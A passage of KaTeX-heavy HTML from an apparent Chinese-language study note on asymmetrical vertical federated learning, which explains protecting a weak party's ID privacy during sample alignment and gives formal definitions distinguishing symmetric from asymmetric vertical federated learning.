class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mi mathvariant="normal">/</mi><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow><mo>≈</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\left|\mathcal{I}_{2}^{o}\right| /\left|\mathcal{I}^{w}\right| \approx 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mi mathvariant="normal">/</mi><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow><mo>≫</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\left|\mathcal{I}_{1}^{o}\right| /\left|\mathcal{I}^{w}\right| \gg 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≫</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p>一种常见的情况是，建立的联邦学习是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的学习任务。纵向联邦数据分布如图2所示， <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是联邦学习中的弱方（weak side），因为  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">P</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{P}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span> 中每个样本的ID都被视为敏感数据，也就是说在求交 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的过程中其隐私会被严重危害。在这种<code>强弱联邦（federation of the weak and the strong）</code>中，有必要在ID对齐阶段保护弱方的ID隐私，这种方案称为<code>非对称纵向联邦学习（Asymmetrical Vertical Federated Learning, AVFL）</code>。</p><p>不考虑<code>弱联邦（federation of the weak）</code>，因为我们可以通过将全空间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">\mathcal{I}^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span> 缩减为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mi mathvariant="normal">\</mi><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>∪</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathcal{I}^{w} \backslash\left(\mathcal{I}_{1}^{o} \cup \mathcal{I}_{2}^{o}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mord">\</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> ，从而将”弱联邦“转化为“强联邦”。</p><p><em>（没看懂弱联邦说的是啥）</em></p><p><strong>假设1：</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo>=</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mn>0</mn></msubsup><mo>∪</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}^w=\mathcal{I}^0_1\cup \mathcal{I}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0622em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span></p><p><strong>定义1：</strong></p><ol><li>如果满足以下条件，则称为 <code>Symmetrically Vertical Federated Learning(SVFL)</code>：</li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo>≤</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow></mfrac><mo separator="true">,</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow></mfrac><mo>≤</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">-\frac{1}{2} \leq \log _{10} \frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|}, \log _{10} \frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|} \leq 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></span></p><ol start="2"><li><p>如果以下两个条件中任意一个等式成立，都可以称为``Asymmetrical Vertical Federated Learning(AVFL)` ：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow></mfrac><mo>&lt;</mo><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">∣</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">∣</mo></mrow><mrow><mo fence="true">∣</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">∣</mo></mrow></mfrac><mo>&lt;</mo><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}\log _{10} \frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|}&lt;-\frac{1}{2} \\\log _{10} \frac{\left|\mathcal{I}_{2}^{o}\right|}{\left|\mathcal{I}^{w}\right|}&lt;-\frac{1}{2}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.1104em;vertical-align:-1.3052em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8052em;"><span style="top:-3.8052em;"><span class="pstrut" style="height:3.0352em;"></span><span class="mord"><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0352em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.214em;margin-left:-0.0738em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span 